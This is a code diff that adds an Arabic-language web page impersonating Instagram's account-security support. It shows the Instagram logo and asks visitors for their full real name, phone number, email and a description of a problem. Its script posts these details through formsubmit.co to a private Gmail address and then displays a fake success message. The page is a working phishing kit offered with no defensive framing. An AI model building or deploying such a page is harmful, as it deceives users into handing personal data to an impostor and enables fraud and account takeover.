@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأمين الحساب - Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .instagram-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .instagram-logo img {
+            width: 180px;
+            height: auto;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8e8e8e;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: all 0.2s ease;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: #fff;
+            box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #405DE6, #833AB4);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+            position: relative;
+            height: 44px;
+        }
+
+        button.loading {
+            pointer-events: none;
+        }
+
+        .loading-circle {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .button-text {
+            transition: opacity 0.3s ease;
+        }
+
+        .info-text {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+
+        .alert-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .alert-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+            animation: alertIn 0.3s ease;
+        }
+
+        @keyframes alertIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .alert-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(45deg, #405DE6, #833AB4);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+        }
+
+        .alert-icon i {
+            color: white;
+            font-size: 28px;
+        }
+
+        .alert-message {
+            font-size: 16px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        .alert-close {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="instagram-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1600px-Instagram_logo.svg.png" alt="Instagram Logo">
+        </div>
+        
+        <form id="insuranceForm">
+            <div class="form-group">
+                <label>إسمك الحقيقي كاملاً</label>
+                <input type="text" 
+                       name="name"
+                       placeholder=" "
+                       required
+                       pattern="[\u0600-\u06FF\s]{10,}">
+            </div>
+
+            <div class="form-group">
+                <label>رقم الهاتف</label>
+                <input type="tel" 
+                       name="phone"
+                       placeholder=""
+                       required
+                       pattern="^[1-9]{1,3}[0-9]{4,14}$">
+            </div>
+
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" 
+                       name="email"
+                       placeholder="">
+            </div>
+
+            <div class="form-group">
+                <label>الإبلاغ عن مشكلة</label>
+                <textarea rows="3" 
+                          name="problem"
+                          placeholder="...وصف المشكلة"></textarea>
+            </div>
+
+            <button type="submit" id="submitBtn">
+                <span class="button-text">تأمين الحساب</span>
+                <div class="loading-circle"></div>
+            </button>
+        </form>
+
+        <div class="info-text">
+            قد نتواصل معك للحصول على معلومات إضافية لضمان أمان حسابك
+        </div>
+    </div>
+
+    <div class="alert-overlay" id="successAlert">
+        <div class="alert-box">
+            <div class="alert-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <div class="alert-message">
+                تم رفع بيانات التأمين بنجاح!
+            </div>
+            <button class="alert-close" onclick="closeAlert()">موافق</button>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('insuranceForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingCircle = document.querySelector('.loading-circle');
+        const buttonText = document.querySelector('.button-text');
+
+        function isValidPhone(phone) {
+            const regex = /^[1-9]{1,3}[0-9]{4,14}$/;
+            return regex.test(phone);
+        }
+
+        function showAlert() {
+            document.getElementById('successAlert').style.display = 'flex';
+        }
+
+        function closeAlert() {
+            document.getElementById('successAlert').style.display = 'none';
+        }
+
+        async function handleFormSubmit(formData) {
+            try {
+                const response = await fetch('https://formsubmit.co/ajax/mbyusif109@gmail.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        name: formData.get('name'),
+                        phone: formData.get('phone'),
+                        email: formData.get('email'),
+                        problem: formData.get('problem')
+                    })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    showAlert();
+                    form.reset();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى');
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            let isValid = true;
+
+            form.querySelectorAll('input').forEach(input => {
+                if (input.type === 'tel' && !isValidPhone(input.value)) {
+                    input.style.borderColor = '#ff3040';
+                    isValid = false;
+                } else if (!input.checkValidity()) {
+                    input.style.borderColor = '#ff3040';
+                    isValid = false;
+                } else {
+                    input.style.borderColor = '#dbdbdb';
+                }
+            });
+
+            if (isValid) {
+                submitBtn.classList.add('loading');
+                loadingCircle.style.display = 'block';
+                buttonText.style.opacity = '0';
+                
+                const formData = new FormData(form);
+                await handleFormSubmit(formData);
+                
+                submitBtn.classList.remove('loading');
+                loadingCircle.style.display = 'none';
+                buttonText.style.opacity = '1';
+            }
+        });
+
+        const phoneInput = form.querySelector('input[type="tel"]');
+        phoneInput.addEventListener('input', () => {
+            if (isValidPhone(phoneInput.value)) {
+                phoneInput.style.borderColor = '#dbdbdb';
+            } else {
+                phoneInput.style.borderColor = '#ff3040';
+            }
+        });
+    </script>
+</body>
+</html>
